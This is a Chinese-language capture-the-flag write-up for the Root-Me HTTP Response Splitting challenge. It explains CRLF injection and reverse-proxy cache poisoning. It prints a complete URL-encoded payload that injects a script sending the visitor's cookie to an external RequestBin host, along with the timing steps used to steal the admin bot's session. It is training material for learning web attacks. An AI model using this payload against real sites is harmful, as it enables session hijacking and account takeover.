## [[Root-Me](https://www.root-me.org/)] [[Web-Client](https://www.root-me.org/en/Challenges/Web-Client/)] [[HTTP Response Splitting](https://www.root-me.org/en/Challenges/Web-Client/HTTP-Response-Splitting)] [[解题报告](http://exp-blog.com/2019/02/18/pid-3352/)]

------

## 吐槽

搞了 4 天，忍不住想喷死出题的，这题其实不是很难，就是题目的机制和 robot 的行为太恶心，而且这些行为还是隐藏的，要自己慢慢摸索。

摸索都算了，这其实很正常，关键是摸索规则出来之后，发现这些规则跟学习 HRS（HTTP Response Splitting） 原理半毛线关系都没有，就是存心恶心人，让你就算做出了正确答案，也要靠运气才能蒙过去。

要比喻的就是，考试明明所有题都做对了，老师就是故意不理你，不告诉你考了多少分，还误导你可能没全做对，让你再想想是不是做错了哪里，本来你就是刚开始学的，因为基础不牢固，结果越想越怀疑自己，越想越跑偏，这不本末倒置么。

------------

## 题目分析

喷完了就开始分析这题的解题思路。

首先关注题目描述有几个关键字：

- HTTP Response Splitting ： HTTP 响应头切割（下面简称 HRS）
- reverse proxy cache ： 网站启用了反向代理缓存
- administrator often logs in：管理员 robot 会经常登录站点
- IPv4 only：现在虽然都 2019 年了但 IPv4 还没到淘汰地步，所以不用管，跟解题没什么关系

而我们要做的就是窃取管理员的 Cookie 登陆管理页面。

------------

## 考察技能

这题主要考察关于 **HRS** 和 **反向代理** 的原理，是这题的解题关键，必须彻底弄懂。

可以参考这几篇文章，说得很清楚了，很有参考价值：

- [浅谈HTTP响应拆分攻击](http://www.moqifei.com/archives/609)
- [WebGoat教程解析——HTTP Response Splitting](https://blog.csdn.net/eatmilkboy/article/details/8061159)
- [HTTP Response Splitting - Divide and Conquer](http://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20HTTP%20Response%20Splitting%20-%20Divide%20and%20Conquer.pdf)

------------


而有 反向代理 必定有 正向代理，虽然 正向代理 与本题无关，但最好还是了解一下。

我找了一张图，很清楚了画出了 反向代理 和 正向代理 的区别：

![](http://exp-blog.com/wp-content/uploads/2019/02/e2e7a6dde0a0a0466ade27a1200edcb9.png)


简单来说，**反向代理** 是服务端搭建的，角色定位是防御，主要作用包括：隐藏服务端集群的具体机器、通过缓存加速客户端访问等，常见的反向代理如 Nginx。

而 **正向代理** 是客户端搭建的，角色定位是攻击，主要作用包括：隐藏客户端身份发起攻击、翻墙等，常见的正向代理如 Shadowsocks。

------------

## 找到注入点

有了前面的基础知识，就可以开始解题了，首先要找到注入点。

整个挑战其实只有3个页面：

- **选择语言页面**：[http://challenge01.root-me.org:58002/user/lang](http://challenge01.root-me.org:58002/user/lang)
- **主页**：[http://challenge01.root-me.org:58002/home](http://challenge01.root-me.org:58002/home)
- **管理页面**：[http://challenge01.root-me.org:58002/admin](http://challenge01.root-me.org:58002/admin)

有一点需要注意的是，开启挑战后，**选择语言页面** 只会出现一次，除非删除浏览器 cookie ，否则之后无论如何也不会再看见这个页面。

这就导致有些同学很容易就把这个页面忽略了，一直在 **主页** 和 **管理页面** 之间徘徊找注入点，浪费了大量时间而却只是无用功。


------------

其实真正的注入点恰恰就在 **选择语言页面** 。

从页面源码可知，只有 `lang=fr` 和 `lang=en` 两种语言可供选择。

![](http://exp-blog.com/wp-content/uploads/2019/02/04db44aae586c22b3e7dcda2752f73a5.png)


但是使用 Burp Suite -> Repeater 工具构造 payload，可以发现修改请求参数 `lang=any_value` 为任意值，都会在响应头的 `Cookie-Set` 中回显。

![](http://exp-blog.com/wp-content/uploads/2019/02/76f839a73daa7115678b29770e760610.png)


换言之这很可能就是注入点，而且从形式上看，应该就是 HRS 。

为了验证是不是 HRS ，不妨尝试注入 `lang=exp%0D%0Ahrs` （ `%0D%0A` 是 **回车换行符** 的 URL 编码，亦即 `\r\n` ，亦即 `CRLF` 。若不理解为什么要注入回车换行，先去学习下 HRS 的基本原理再继续往下阅读）

可以发现注入成功，这样就具备攻击条件了。

![](http://exp-blog.com/wp-content/uploads/2019/02/cc5b3fea016bfc5b91aa50ed6c23f767.png)

------------

## 解题思路

不要忘记题目有个信息：站点启用了 **反向代理缓存** 。

换言之我们可以尝试使用 **HRS + 反向代理** 实现 **缓存污染** 。


------------

总结而言，攻击分五步：

- (1) 通过 CRLF 构造适当的 HRS 请求在服务器构造两个响应页面（构造细节可参考 [Github : CRLF - Write HTML](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CRLF%20injection)，下面也会详述），其中第一个响应页对应本次请求，第二个响应页则由于还没有请求，导致在服务器挂起（下面称之为 payload 页面）。
- (2) 在发动第 (1) 步攻击后，马上向服务器请求 `/admin` 页面，由于此时 payload 页面处于挂起状态，根据 HTTP 协议的特性会将其马上返回给 `/admin` 请求。在这一瞬间，会同时利用了服务器反向代理的特点（通过缓存机制加速访问），即 `/admin` 请求 与 payload 页面的映射关系会被自动绑定到了反向代理缓存。这样在缓存过期之前，无论谁发起 `/admin` 请求，都是从反向代理缓存获得 payload 页面，而不会从真正访问到 HTTP 服务器，亦即我们把缓存污染了。
- (3) payload 页面是经过精心设计的，具备窃取当前访问用户的 Cookie 并发到 Hacker 服务器的功能。
- (4) Hacker 等待 robot 管理员发起 `/admin` 页面请求，从而获得管理员 Cookie 。
- (5) 在反向代理缓存过期后，Hacker 利用管理员 Cookie 向真正的 HTTP 服务器发起 `/admin` 页面请求，实现登录。

梳理好攻击步骤后，明显本题的 **解题关键在于如何构造 payload 页面**。

------------

## 构造 payload 页面

首先需要知道，提交请求 `http://challenge01.root-me.org:58002/user/param?lang=[注入点]` 的响应是这样的：

```html
HTTP/1.1 302 Found
Set-Cookie: lang=[注入点]; Expires=Thu, 28 Feb 2019 14:59:14 GMT; Path=/
Server: WorldCompanyWebServer
Connection: close
Location: /home
Date: Thu, 21 Feb 2019 14:59:14 GMT
Content-Type: text/html
Content-Length: 0
```


先不考虑 `[注入点]` 的 payload 怎么写，而是先看看我们最终期望的响应，应该是这样的：

```html
[01] HTTP/1.1 302 Found
[02] ......
[03] {CRLF} Content- Length: 0
[04] {CRLF}
[05] {CRLF} HTTP/1.1 200 OK
[06] {CRLF} Content-Type: text/html
[07] {CRLF} X-XSS-Protection: 0
[08] {CRLF} Last-Modified: Thu, 01 Jan 2099 12:00:00 GMT
[09] {CRLF} Content-Length: 137
[10] {CRLF}
[11] {CRLF} <script>document.write("<h1>EXP</h1><img src=http://requestbin.fullcontact.com/148xfw11?".concat(document.cookie).concat(" />"))</script>
```

> 注：每行的行首都有一组 `{CRLF}` ，表示每行之间都有回车换行符号进行分隔

**逐行解释**：

- `[01]` 和 `[02]` 是原本的响应内容，这部分的响应对我们没用，所以无需关心内容是什么
- `[03]` 从这行开始就是注入内容，正因为我们不关心原本的第一个响应内容，所以用 `Content- Length: 0` 直接标记第一个响应结束（**注意这里的每一个空格，不知为何很重要，少一个都不行**）
- `[04]` 是一个空行，这很重要，用于分隔第一个和第二个响应内容
- `[05]` 这里开始就是我们要构造的第二个响应内容
- `[06]` 必要的响应头之一，标明我们构造的响应页面内容类型
- `[07]` 非必要的响应头，但是以防万一，用于关闭页面的 XSS 保护，使得我们可以注入 XSS 脚本
- `[08]` 必要的响应头之一，要使得反向代理服务器的缓存在过期前可以被持续污染，就需要把 `Last-Modified` 设置为一个未来值，这样代理服务器就以为缓存没有更新过，从而对我们的 payload 页面进行保持，而不会向 HTTP 服务器获取新的缓存进行覆盖。
- `[09]` 在 `HTTP/1.1` 版本之前是必要的响应头之一、这个版本之后则无关重要了。`Content-Length` 的值需要刚好就是 `[11]` 页面内容的长度（按ASCII字符计算，包括空字符），若过长会造成等待响应内容超时、过短会截断页面内容。
- `[10]` 是一个空行，这很重要，用于分隔第二个响应的响应头和页面内容。
- `[11]` 页面内容，这里我只构造了一个 JS 脚本，其功能是向预设的 [RequestBin](http://requestbin.fullcontact.com) 服务器发送访问这个页面的用户的 Cookie ，这样当管理员浏览这个页面时，就会被窃取 Cookie 。


------------


回到前面的 `[注入点]` ，根据我们期望的响应内容，将其转换成 URL 编码，因此在 `[注入点]` 的位置构造 payload 应该是这样的：

```html
%0D%0AContent-%20Length%3A%200
%0D%0A
%0D%0AHTTP%2F1.1%20200%20OK
%0D%0AContent-Type%3A%20text%2Fhtml
%0D%0AX-XSS-Protection%3A%200
%0D%0ALast-Modified%3A%20Thu%2C%2001%20Jan%202099%2012%3A00%3A00%20GMT%20
%0D%0AContent-Length%3A%20137
%0D%0A
%0D%0A%3cscript%3edocument.write(%22%3ch1%3eEXP%3c%2fh1%3e%3cimg%20src%3dhttp%3a%2f%2frequestbin.fullcontact.com%2f148xfw11%3f%22.concat(document.cookie).concat(%22%20%2f%3e%22))%3c%2fscript%3e
```

我们把每部分拼接起来，<font color="red">**最终的 payload 请求**</font> 是这样的：

```html
http://challenge01.root-me.org:58002/user/param?lang=fr%0D%0AContent-%20Length%3A%200%0D%0A%0D%0AHTTP%2F1.1%20200%20OK%0D%0AContent-Type%3A%20text%2Fhtml%0D%0AX-XSS-Protection%3A%200%0D%0ALast-Modified%3A%20Thu%2C%2001%20Jan%202099%2012%3A00%3A00%20GMT%20%0D%0AContent-Length%3A%20137%0D%0A%0D%0A%3cscript%3edocument.write(%22%3ch1%3eEXP%3c%2fh1%3e%3cimg%20src%3dhttp%3a%2f%2frequestbin.fullcontact.com%2f148xfw11%3f%22.concat(document.cookie).concat(%22%20%2f%3e%22))%3c%2fscript%3e
```

现在尝试通过 Burp 把 payload 发送到服务器，看看效果如何：

![](http://exp-blog.com/wp-content/uploads/2019/02/45743aea122ae7c2bc474c0416d1f830.png)

------------

## 发起攻击

既然拥有 payload 就可以发起攻击了，步骤其实很简单，前面也已经说过了：

- (1) 提交前面的 payload 请求
- (2) 马上访问 [http://challenge01.root-me.org:58002/admin](http://challenge01.root-me.org:58002/admin) 页面，如果返回的是我们构造的 payload 响应页面，则污染缓存成功
- (3) 登录 payload 响应页面中预设的 [RequestBin](http://requestbin.fullcontact.com) 服务器等待管理员 Cookie

------------

## 攻击过程的细节

事实上，攻击过程并没有我们想象中顺利，这是这题最恶心的地方，尤其是在不知道自己的 payload 是否正确的前提下，真的能调试到你怀疑人设。

总结一下，我遇到的细节问题有以下这些：

- 经测试无法使用 Burp 发起缓存污染攻击，原因不明。
- 只有 IE 或 Edge 浏览器可以用来执行这个挑战，且要求 IE 或 Edge 关闭所有安全选项。
- 发起 payload 请求后，服务器默认的第一个响应是一个 302 页面，跳转的 `Location` 是 `/home` 页面。由于其跳转速度非常快，导致我们尝试使用 `/admin` 请求绑定我们构造的第二个 payload 响应前，就很可能被 `/home` 请求抢先一步绑定了 payload 响应（**换言之可供我们操作的时间可能还不到 1 秒**）。
- Robot 管理员只会扫描 `/admin` 页面，如果被 `/home` 抢先一步绑定了第二个 payload 响应，那么我们构造的 payload 就无法窃取管理员 Cookie 。亦即第一个响应的 302 跳转目的之一是拦截我们的污染缓存攻击。
- Robot 管理员的行为不可预见，亦即它在访问 `/admin` 页面时，会不会读取图片、有没有启用 JS 脚本等都是未知的，我们需要逐个 html 标签进行注入调试。
- 由于这个挑战是运行在沙盒的，这个沙盒会对每个新的挑战 Cookie 分配一个 SessionId 。因此若某一次污染缓存失败或窃取 Cookie 失败，就需要重新领取一个新的 SessionId 进行调试。而在 Burp 无法使用的情况下，要获取新的 SessionId 只有一个方法，重置挑战环境参数：注销 rootme 的登陆，清除浏览器 Cookie 和缓存，然后重登 rootme 再重开挑战。
- 反向代理缓存的过期时间是 15 分钟，亦即在绑定 `/admin` 与 payload 响应失败后，要么等 15 分钟再试，要么重置挑战环境参数（这个是真的烦，繁琐的重置步骤能重置到吐血）。
- 由于这是一个沙盒，且 Robot 管理员是通过 SessionId 区分每个用户的挑战环境的，因此可以考虑通过代码并行操作来提高污染缓存的成功率。
- Chrome 和 Firefox 浏览器因自身的安全机制，是无法某些渗透攻击的，包括这个挑战在内。因为这个挑战的 payload 会不断用到重定向，导致多试几次就会报错并拦截攻击：
![](http://exp-blog.com/wp-content/uploads/2019/02/277b2bd69525399c144631405d430fd5.png)


由此可知，这题除了题目表面的描述提示，其实还隐藏了很多解题要点，先了解的话可以少走很多弯路。

这里要感谢 rootme 社区的讨论组，给了我不少启发：

- [https://www.root-me.org/?page=forum&id_thread=2127](https://www.root-me.org/?page=forum&id_thread=2127)
- [https://www.root-me.org/?page=forum&id_thread=3184](https://www.root-me.org/?page=forum&id_thread=3184)
- [https://www.root-me.org/?page=forum&id_thread=4845](https://www.root-me.org/?page=forum&id_thread=4845)


------------

## 完成挑战


经过孜孜不倦的重试，我最后是通过 IE 浏览器完成挑战的。

![](http://exp-blog.com/wp-content/uploads/2019/02/1c0148d7245dba24d659399a654f33d3.png)

我用 IE 浏览器预先打开两个标签，一个准备发送 payload ，一个准备请求 `/admin` 页面。

然后就是和时间赛跑：在提交 payload 的一瞬间，马上发送 `/admin` 请求。

![](http://exp-blog.com/wp-content/uploads/2019/02/33b644e44e0aafdbcf535111fe621a61.png)

重复 N 次后，终于使得 `/admin` 请求成功地与我们构造的 payload 页面绑定到一起：

![](http://exp-blog.com/wp-content/uploads/2019/02/2fb255c252f75c8c9247c719d87584c1.png)

此时几乎同一时间，我就在 [RequestBin](http://requestbin.fullcontact.com) 服务器收到 Robot 访问 payload 页面后被窃取的 `admin_session` ：

![](http://exp-blog.com/wp-content/uploads/2019/02/be01d773656c7237b56cfb8f4d7e0dbf.png)

利用 `admin_session` 访问  `/admin` 页面，被告知 `admin_session` 的值 `946a0b2d-c590-46f9-86fd-f7e76062779d` 就是 flag ，完成挑战。

![](http://exp-blog.com/wp-content/uploads/2019/02/99df706ae4285e4b4d2777f4647d76b1.png)

------

## 版权声明

　[![Copyright (C) 2016-2019 By EXP](https://img.shields.io/badge/Copyright%20(C)-2016~2019%20By%20EXP-blue.svg)](http://exp-blog.com)　[![License: GPL v3](https://img.shields.io/badge/License-GPL%20v3-blue.svg)](https://www.gnu.org/licenses/gpl-3.0)
  

- Site: [http://exp-blog.com](http://exp-blog.com) 
- Mail: <a href="mailto:289065406@qq.com?subject=[EXP's Github]%20Your%20Question%20（请写下您的疑问）&amp;body=What%20can%20I%20help%20you?%20（需要我提供什么帮助吗？）">289065406@qq.com</a>


------
